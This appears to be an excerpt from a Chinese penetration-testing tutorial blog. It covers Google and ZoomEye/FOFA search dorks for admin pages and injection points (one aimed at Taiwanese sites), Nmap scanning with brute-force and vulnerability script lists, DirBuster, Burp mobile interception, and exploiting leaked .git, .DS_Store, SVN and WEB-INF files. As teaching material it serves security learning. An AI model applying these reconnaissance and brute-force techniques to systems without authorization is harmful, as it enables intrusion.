<li><strong>site:baidu.com intext:管理</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps17.jpg" alt="img"> </p>
<ol start="6">
<li><strong>site:baidu.com inurl:login</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps18.jpg" alt="img"> </p>
<ol start="7">
<li><strong>site:baidu.com intitle:后台</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps19.jpg" alt="img"> </p>
<p>查看服务器使用的程序</p>
<ol start="8">
<li><strong>site:baidu.com filetype:asp</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps20.jpg" alt="img"> </p>
<ol start="9">
<li><strong>site:baidu.com filetype:php</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps21.jpg" alt="img"> </p>
<ol start="10">
<li><strong>site:baidu.com filetype:jsp</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps22.jpg" alt="img"> </p>
<p>查看上传漏洞：</p>
<ol start="11">
<li><strong>site:baidu**</strong>.com** <strong>inurl:file</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps23.jpg" alt="img"> </p>
<ol start="12">
<li><strong>site: baidu**</strong>.com** <strong>inurl:load</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps24.jpg" alt="img"> </p>
<p>查找注射点：</p>
<ol start="13">
<li><strong>site:tw inurl:asp?id=</strong>    这个是找台湾的</li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps25.jpg" alt="img"> </p>
<h3 id="1-6-4-Google的优劣势"><a href="#1-6-4-Google的优劣势" class="headerlink" title="1.6.4 Google的优劣势"></a>1.6.4 <strong>Google的优劣势</strong></h3><p>​    优势：</p>
<p>l 只需一台可以访问Google的联网设备，部署简单；</p>
<p>l 检索资源库丰富；</p>
<p>劣势：</p>
<p>l 搜索关键词多，记忆复杂；</p>
<p>l GoogleHack需要借助浏览器，属于在线工具，离线不能使用；</p>
<p>l 国内访问Google需借助VPN等相关手段，增加了上网成本</p>
<h2 id="1-7-Nmap"><a href="#1-7-Nmap" class="headerlink" title="1.7 Nmap"></a>1.7 <strong>Nmap</strong></h2><p><a href="http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html">http://blog.sina.com.cn/s/blog_811d9fdd0101ey07.html</a>  功能介绍</p>
<p><a href="http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html">http://www.cnblogs.com/c4isr/archive/2012/12/07/2807491.html</a> 10种扫描方式解释</p>
<p>​    由于是在win7上面使用，所以要使用兼容win7的winpcap驱动，这里我们使用最新版4.1.2版</p>
<p>winpcap4.1.2下载地址：<a href="http://www.onlinedown.net/soft/2685.htm">http://www.onlinedown.net/soft/2685.htm</a></p>
<h3 id="1-7-1-功能-介绍"><a href="#1-7-1-功能-介绍" class="headerlink" title="1.7.1 功能**介绍**"></a>1.7.1 <strong>功能**</strong>介绍**</h3><p>Nmap是一个网络连接端口扫描<a href="http://baike.baidu.com/view/37.htm">软件</a>，用来扫描网上电脑开放的网络连接端口。确定哪些<a href="http://baike.baidu.com/view/133203.htm">服务</a>运行在哪些连接端口，并且推断计算机运行哪个<a href="http://baike.baidu.com/view/880.htm">操作系统</a>。它是网络管理员必用的<a href="http://baike.baidu.com/view/37.htm">软件</a>之一，以及用以评估网络系统安全。</p>
<p>功能架构图：</p>
<h3 id="1-2-2-部署指南"><a href="#1-2-2-部署指南" class="headerlink" title="1.2.2 部署指南"></a>1.2.2 <strong>部署指南</strong></h3><p>两种部署方式：</p>
<p>l Kail集成环境</p>
<p>l 单独安装（使用yum工具直接安装就可以）</p>
<h3 id="1-2-3-实战"><a href="#1-2-3-实战" class="headerlink" title="1.2.3 实战"></a>1.2.3 <strong>实战</strong></h3><p>Nmap的参数和选项繁多，功能非常丰富。我们先来看一下Nmap的通用命令格式：（详细教程及下载方式参见：<a href="http://nmap.org/%EF%BC%89">http://nmap.org/）</a></p>
<p><strong>Nmap**</strong>&lt;扫描选项&gt;&lt;扫描****目标****&gt;**</p>
<p>(一) <strong>主机发现</strong></p>
<h4 id="1-主机发现原理"><a href="#1-主机发现原理" class="headerlink" title="1) 主机发现原理"></a>1) <strong>主机发现原理</strong></h4><p>主机发现的原理与Ping命令类似，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送ICMP ECHO/TIMESTAMP/NETMASK报文、发送TCPSYN/ACK包、发送SCTP INIT/COOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。</p>
<h4 id="2-主机发现-的基本用法"><a href="#2-主机发现-的基本用法" class="headerlink" title="2) 主机发现**的基本用法**"></a>2) <strong>主机发现**</strong>的基本用法**</h4><p>l -sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。 </p>
<p>l -sn: Ping Scan 只进行主机发现，不进行端口扫描。 </p>
<p>l -Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。 </p>
<p>l -PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。 </p>
<p>l -PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。</p>
<p>l -PO[protocollist]: 使用IP协议包探测对方主机是否开启。</p>
<p>l  -n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。 </p>
<p>l –dns-servers &lt;serv1[,serv2],…&gt;: 指定DNS服务器。 </p>
<p>l –system-dns: 指定使用系统的DNS服务器 </p>
<p>l –traceroute: 追踪每个路由节点 </p>
<h4 id="3-使用-演示"><a href="#3-使用-演示" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>扫描局域网10.1.1.1-10.1.1.100范围内哪些IP的主机是活动的。</p>
<p>​    命令如下：nmap –sn 10.1.1.1-100</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps26.jpg" alt="img"> </p>
<p>由图可知：10.1.1.2、10.1.1.100两台主机处于存活状态。</p>
<p>(二) <strong>端口**</strong>扫描**</p>
<h4 id="1-端口-扫描原理"><a href="#1-端口-扫描原理" class="headerlink" title="1) 端口**扫描原理**"></a>1) <strong>端口**</strong>扫描原理**</h4><p>端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCP/UDP端口的开放情况。默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。Nmap通过探测将端口划分为6个状态：<br>open：端口是开放的。<br>closed：端口是关闭的。<br>filtered：端口被防火墙IDS/IPS屏蔽，无法确定其状态。<br>unfiltered：端口没有被屏蔽，但是否开放需要进一步确定。<br>open|filtered：端口是开放的或被屏蔽。<br>closed|filtered ：端口是关闭的或被屏蔽。</p>
<p>端口扫描方面非常强大，提供了很多的探测方式：</p>
<p>l TCP SYN scanning</p>
<p>l TCP connect scanning</p>
<p>l TCP ACK scanning</p>
<p>l TCP FIN/Xmas/NULL scanning</p>
<p>l UDP scanning</p>
<p>l 其他方式</p>
<h4 id="2-端口-扫描用法"><a href="#2-端口-扫描用法" class="headerlink" title="2) 端口**扫描用法**"></a>2) <strong>端口**</strong>扫描用法**</h4><p>l -sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。 </p>
<p>l -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。 </p>
<p>l -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。 </p>
<p>l –scanflags <flags>: 定制TCP包的flags。 </p>
<p>l -sI &lt;zombiehost[:probeport]&gt;: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）</p>
<p>l -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。 </p>
<p>l -sO: 使用IP protocol 扫描确定目标机支持的协议类型。</p>
<p>l -b <FTP relay host>: 使用FTP bounce scan扫描方式 </p>
<h4 id="3-使用-演示-1"><a href="#3-使用-演示-1" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>在此，我们以主机10.1.1.100为例。命令如下：nmap -sS -sU -T4 -top-ports 300 1.1.1.100</p>
<p>参数-sS表示使用TCP SYN方式扫描TCP端口；-sU表示扫描UDP端口；-T4表示时间级别配置4级；–top-ports 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口）。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps27.jpg" alt="img"> </p>
<p>(三) <strong>版本**</strong>侦测**</p>
<h4 id="1-版本-侦测原理"><a href="#1-版本-侦测原理" class="headerlink" title="1) 版本**侦测原理**"></a>1) <strong>版本**</strong>侦测原理**</h4><p>简要的介绍版本的侦测原理。版本侦测主要分为以下几个步骤：</p>
<p>l 首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。</p>
<p>l 如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap-services-probes中Probe TCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。</p>
<p>l 如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap-services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。</p>
<p>l 如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。</p>
<p>l 如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。</p>
<p>l 如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。</p>
<h4 id="2-版本-侦测用法"><a href="#2-版本-侦测用法" class="headerlink" title="2) 版本**侦测用法**"></a>2) <strong>版本**</strong>侦测用法**</h4><p>l -sV: 指定让Nmap进行版本侦测 </p>
<p>l –version-intensity <level>: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。 </p>
<p>l –version-light: 指定使用轻量侦测方式 (intensity 2) </p>
<p>l –version-all: 尝试使用所有的probes进行侦测 (intensity 9) </p>
<p>l –version-trace: 显示出详细的版本侦测过程信息。 </p>
<h4 id="3-使用-演示-2"><a href="#3-使用-演示-2" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>对主机10.1.1.100进行版本侦测。</p>
<p>命令如下：nmap –sV 10.1.1.100</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps28.jpg" alt="img"> </p>
<p>(四) <strong>OS侦测</strong></p>
<h4 id="1-OS-侦测原理"><a href="#1-OS-侦测原理" class="headerlink" title="1) OS**侦测原理**"></a>1) <strong>OS**</strong>侦测原理**</h4><p>Nmap使用TCP/IP协议栈指纹来识别不同的操作系统和设备。在RFC规范中，有些地方对TCP/IP的实现并没有强制规定，由此不同的TCP/IP方案中可能都有自己的特定方式。Nmap主要是根据这些细节上的差异来判断操作系统的类型的。<br>具体实现方式如下：<br>Nmap内部包含了2600多已知系统的指纹特征（在文件nmap-os-db文件中）。将此指纹数据库作为进行指纹对比的样本库。分别挑选一个open和closed的端口，向其发送经过精心设计的TCP/UDP/ICMP数据包，根据返回的数据包生成一份系统指纹。将探测生成的指纹与nmap-os-db中指纹进行对比，查找匹配的系统。如果无法匹配，以概率形式列举出可能的系统。</p>
<h4 id="2-OS-侦测用法"><a href="#2-OS-侦测用法" class="headerlink" title="2) OS**侦测用法**"></a>2) <strong>OS**</strong>侦测用法**</h4><p>l -O: 指定Nmap进行OS侦测。 </p>
<p>l –osscan-limit: 限制Nmap只对确定的主机的进行OS探测（至少需确知该主机分别有一个open和closed的端口）。 </p>
<p>l –osscan-guess: 大胆猜测对方的主机的系统类型。由此准确性会下降不少，但会尽可能多为用户提供潜在的操作系统。 </p>
<h4 id="3-使用-演示-3"><a href="#3-使用-演示-3" class="headerlink" title="3) 使用**演示**"></a>3) <strong>使用**</strong>演示**</h4><p>命令：nmap –O 10.1.1.100</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps29.jpg" alt="img"> </p>
<p>(五) <strong>漏洞扫描</strong></p>
<p><strong>扫描端口并且标记可以爆破的服务</strong></p>
<p><strong>nmap</strong> 目标 –script=ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute</p>
<p><strong>判断常见的漏洞并扫描端口</strong></p>
<p><strong>nmap</strong> 目标 –script=auth,vuln</p>
<p><strong>精确判断漏洞并扫描端口</strong></p>
<p><strong>nmap</strong> 目标 –script=dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</p>
<h3 id="1-2-4-Nmap-的优劣势"><a href="#1-2-4-Nmap-的优劣势" class="headerlink" title="1.2.4 Nmap**的优劣势**"></a>1.2.4 <strong>Nmap**</strong>的优劣势**</h3><p>优势：</p>
<p>l 功能灵活强大，支持多种目标，大量计算机的同时扫描；</p>
<p>l 开源，相关帮助文档十分详细；</p>
<p>l 流行，由于其具有强大的扫描机探测功能，，已被成千上万安全专家使用。</p>
<p>劣势：</p>
<p>l Nmap参数众多，难以一一记忆；</p>
<h2 id="1-8-DirB-uster"><a href="#1-8-DirB-uster" class="headerlink" title="1.8 DirB**uster**"></a>1.8 <strong>DirB**</strong>uster**</h2><h3 id="1-8-1-功能-介绍"><a href="#1-8-1-功能-介绍" class="headerlink" title="1.8.1 功能**介绍**"></a>1.8.1 <strong>功能**</strong>介绍**</h3><p>DirBuster是一款路径及网页暴力破解的工具,可以破解出一直没有访问过或者管理员后台的界面路径。</p>
<h3 id="1-8-2-部署-指南"><a href="#1-8-2-部署-指南" class="headerlink" title="1.8.2 部署**指南**"></a>1.8.2 <strong>部署**</strong>指南**</h3><p>Java运行环境+DirBuster程序包</p>
<h3 id="1-8-3-实战"><a href="#1-8-3-实战" class="headerlink" title="1.8.3 实战"></a>1.8.3 <strong>实战</strong></h3><p>详细教程，参见：</p>
<p><a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project">https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project</a></p>
<p><a href="http://sourceforge.net/projects/dirbuster/">http://sourceforge.net/projects/dirbuster/</a></p>
<p>l 双击运行DirBuster.jar</p>
<p>l 在URL中输入目标URL或者主机IP地址</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps30.jpg" alt="img"> </p>
<p>l 在file with list of dirs/files 栏后点击browse，选择破解的字典库为directory-list-2.3-small.txt</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps31.jpg" alt="img"> </p>
<p>l 将File extension中填入正确的文件后缀，默认为php，如果为jsp页面，需要填入jsp</p>
<p>l 其他选项不变，点击右下角的start，启动目录查找</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps32.jpg" alt="img"> </p>
<p>l 观察返回结果，可点击右下角的report，生成目录报告</p>
<h3 id="1-8-4-DirBuster-优缺点"><a href="#1-8-4-DirBuster-优缺点" class="headerlink" title="1.8.4 DirBuster**优缺点**"></a>1.8.4 <strong>DirBuster**</strong>优缺点**</h3><p>优点：</p>
<p>l 敏感目录发掘能力强</p>
<p>l OWASP安全机构极力推荐</p>
<p>缺点：</p>
<p>l 程序运行线程小</p>
<p>l 探测目录依赖字典文件</p>
<h2 id="1-9-指纹识别"><a href="#1-9-指纹识别" class="headerlink" title="1.9 指纹识别"></a>1.9 <strong>指纹识别</strong></h2><p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps33.png" alt="img"></p>
<h2 id="1-10-扩展：Burp-APP抓包"><a href="#1-10-扩展：Burp-APP抓包" class="headerlink" title="1.10 扩展：Burp APP抓包"></a>1.10 <strong>扩展：Burp APP抓包</strong></h2><p><strong>一、**</strong>手机端配置**</p>
<p>**1.**让安卓手机和电脑连入同一个WIFI，即是在同一个无线局域网环境下。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps34.jpg" alt="img"> </p>
<p>**2.**查看电脑的本地IP地址，命令行下输入ipconfig。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps35.jpg" alt="img"> </p>
<p>无线局域网的IP地址<br>**3.**设置手机代理IP，我这里以oppo系统为例。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps36.jpg" alt="img"> </p>
<p>代理设置为“手动”，设置主机名为电脑无线局域网IP地址，端口可以随便设置，其他的设置可以默认。</p>
<p><strong>二、**</strong>电脑端配置**</p>
<p>**1.**打开Burpsuite，设置Burp suite代理服务器，点击“Proxy”然后“Options”</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps37.jpg" alt="img"> </p>
<p>点击“add”添加和手机一样的IP地址和端口，要跟手机上设置的那个端口一致。记得勾上前面的括号。<br>**2.**设置好了后，在“Proxy”：〉“Intercept”下开启“Intercept is on”就可以对安卓APP的网络数据进行抓包了。</p>
<p><strong>三、证书安装</strong></p>
<p>​    <strong>抓取HTTPS包需要导入Burp的证书。**</strong>特别注意：一个Burp对应一个证书，就是用哪个Burp抓包就导出哪个的证书，并将该证书在手机上安装。非常重要，因为以前抓包安过证书但是用的不是同一个Burp导致抓包失败，浪费了很多时间。**</p>
<p><strong>导出Burp证书步骤为： Proxy—Options—-import\export CA</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps38.jpg" alt="img"> </p>
<p><strong>选择第一个，然后next</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps39.jpg" alt="img"> </p>
<p><strong>选择保存的CA路径，**</strong>文件后缀命名为.cer，非常重要，因为手机只能安装.cer的证书类型，默认的der格式是不能被识别安装的。**</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps40.jpg" alt="img"> </p>
<p><strong>将证书发送到手机，我是直接微信发送的，然后在微信中下载，并记住下载的目录。</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps41.jpg" alt="img"> </p>
<p><strong>找到下载的目录，将证书文件复制到手机存储的**</strong>根目录**<strong>。</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps42.jpg" alt="img"> </p>
<p><strong>打开手机设置–其它设置–安全和隐私–更多安全设置–从SD卡安装</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps43.jpg" alt="img"> </p>
<p><strong>到根目录下，找到.cer文件，安装.cer证书，重命名个名字</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps44.jpg" alt="img"> </p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps45.jpg" alt="img"> </p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps46.jpg" alt="img"> </p>
<p><strong>成功安装后，可以在手机—-设置—-安全和隐私—-更多安全设置—-受信任的凭据—-用户—-看到PortSwigger文件。</strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps47.jpg" alt="img"> </p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps48.jpg" alt="img"> </p>
<p><strong>至此，安装完成。全部工作完成，可以打开burp，准备抓包了。</strong></p>
<h2 id="1-11-扩展-常见信息泄露利用方法"><a href="#1-11-扩展-常见信息泄露利用方法" class="headerlink" title="1.11 扩展:常见信息泄露利用方法"></a>1.11 <strong>扩展:常见信息泄露利用方法</strong></h2><p><strong>一、Git导致文件泄露</strong></p>
<p>​    由于目前的 web 项目的开发采用前后端完全分离的架构:前端全部使用静态文件，和后端代码完全分离，隶属两个不同的项目。表态文件使用 git 来进行同步发布到服务器，然后使用nginx 指向到指定目录，以达到被公网访问的目的。<br>    在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps49.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps50.jpg" alt="img"></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps51.jpg" alt="img"><br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps52.png" alt="img"></p>
<p><strong>二、DS_store导致文件泄露</strong></p>
<p>​    .DS_Store是Mac下Finder用来保存如何展示文件//文件夹的数据文件，每个文件夹下对应一个。由于开发/设计人员在发布代码时未删除文件夹中隐藏的.DS_store，可能造成文件目录结构泄漏、源代码文件等敏感信息的泄露。<br>我们可以模仿一个环境，利用phpstudy搭建PHP环境，把.DS_store文件上传到相关目录。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps53.jpg" alt="img"><br>然后利用工具进行相关检测<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps54.jpg" alt="img"><br>工具下载地址：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>为了让实验更真实，我们在本地搭建环境，然后建立一个文件夹为admin和一个hello文件夹，利用该工具运行完以后，查看工具文件夹查看有什么结果。<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps55.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps56.jpg" alt="img"><br>此文件和我们在一个文件夹内，如果是苹果用户，把文件copy到相关服务器目录以后，都会默认带一个文件.DS_Store。首先访问test.php文件，查看环境是否成功。<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps57.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps58.jpg" alt="img"><br>环境搭建成功 <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps59.jpg" alt="img">我们利用工具进行测试，运行完如上图，运行完以后我们可以到工具目录进行查看<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps60.png" alt="img"> <img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps61.jpg" alt="img">这是一个.DS_Store文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。</p>
<p><strong>三、SVN导致文件泄露</strong></p>
<p>​    Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。<br>    Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。<br>SVN漏洞在实际渗透测试过程中，利用到也比较多，由于一些开发管理员疏忽造成，原理类似DS_Store漏洞。我们这里不再进行搭建环境，给大家推荐工具，利用方法如下：</p>
<ol>
<li>漏洞利用工具： Seay SVN漏洞利用工具</li>
<li>添加网站url<br>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站<br><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps62.jpg" alt="img"><br>下载地址：<a href="https://pan.baidu.com/s/1jGA98jG">https://pan.baidu.com/s/1jGA98jG</a></li>
</ol>
<p><strong>四**</strong>、WEB-INF/web.xml泄露**</p>
<p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</p>
<p>WEB-INF主要包含一下文件或目录：</p>
<p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</p>
<p>/WEB-INF/classes/：含了站点所有用的 <strong>class</strong> 文件，包括 <strong>servlet</strong> <strong>class</strong> 和非<strong>servlet</strong> <strong>class</strong>，他们不能包含在 .<strong>jar</strong>文件中</p>
<p>/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>
<p>/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</p>
<p>/WEB-INF/database.properties：数据库配置文件</p>
<p>原因：<br>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取</p>
<h2 id="1-12-扩展-ZoomEye-hack"><a href="#1-12-扩展-ZoomEye-hack" class="headerlink" title="1.12 扩展: ZoomEye hack"></a>1.12 <strong>扩展:</strong> <strong>ZoomEye</strong> <strong>hack</strong></h2><p>​    ZoomEye 支持公网设备指纹检索和 Web指纹检索的网站，指纹检索包括应用名称、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。<br>设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等。</p>
<p><strong>1**</strong>、实战搜索**</p>
<p>我们今天主要讲下如何使用他的语法规则去高级搜索，搜索有用信息。</p>
<p>· <strong>主机设备搜索组件名称</strong><br>app: 组件名<br>ver: 组件版本<br>例1：搜索使用iis6.0主机：app:”Microsoft-IIS” ver”6.0”，可以看到0.6秒搜索到41，781,210左右的使用iis6.0的主机。</p>
<p>例2：搜索使weblogic主机：app:”weblogic httpd” port:7001，可以看到0.078秒搜索到42万左右的使用weblogic的主机。</p>
<p>例3：查询开放3389端口的主机：port:3389</p>
<p>例4：查询操作系统为Linux系统的服务器，os:linux</p>
<p>例5：查询公网摄像头：service:”routersetup”</p>
<p>例6：搜索美国的 Apache 服务器：app:Apache country:US  后面还可以接city: 城市名称</p>
<p>例7：搜索指定ip信息，ip:121.42.173.26</p>
<p>例8：查询有关taobao.com域名的信息，site:taobao.com</p>
<p>例9：搜索标题中包含该字符的网站，title:weblogic</p>
<p>例10：keywords:Nginx</p>
<h2 id="1-13-扩展-fofa-hack"><a href="#1-13-扩展-fofa-hack" class="headerlink" title="1.13 扩展: fofa hack"></a>1.13 <strong>扩展:</strong> <strong>fofa hack</strong></h2><p>domain=””||ip=””||host=””||title=””||header=””<br>protocol=”https”，搜索指定协议类型</p>
<p>app=”phpinfo”搜索某些组件相关系统</p>
<p>host=”oldboyedu.com/“搜索包含有特定字符的URL</p>
<p>title=”powered by” &amp;&amp; os==windows搜索网页标题中包含有特定字符并且系统是windows的网页</p>
<p>详细请看官方详细文档; <a href="https://fofa.so/help">https://fofa.so/help</a></p>
<p><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>DDOS攻击</title>
    <url>/2020/03/19/DDOS%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="DDOS是DOS攻击中的一种方法。"><a href="#DDOS是DOS攻击中的一种方法。" class="headerlink" title="DDOS是DOS攻击中的一种方法。"></a>DDOS是DOS攻击中的一种方法。</h1><p>参考、：<a href="https://links.jianshu.com/go?to=https://baijiahao.baidu.com/s?id=1603040969904482717&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1603040969904482717&amp;wfr=spider&amp;for=pc</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">　　DoS：是Denial of Service的简称，即拒绝服务，不是DOS操作系统，造成DoS的攻击行为被称为DoS攻击，其目的是使计算机或网络无法提供正常的服务。最常见的DoS攻击有计算机网络带宽攻击和连通性攻击</span><br><span class="line"> 利用程序漏洞或一对一资源耗尽的Denial of Service拒绝服务</span><br><span class="line"></span><br><span class="line">  　DDOS：分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户&#x2F;服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。</span><br><span class="line">一对一的攻击完全拼各自的资源，效果差</span><br><span class="line">多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型</span><br></pre></td></tr></table></figure>

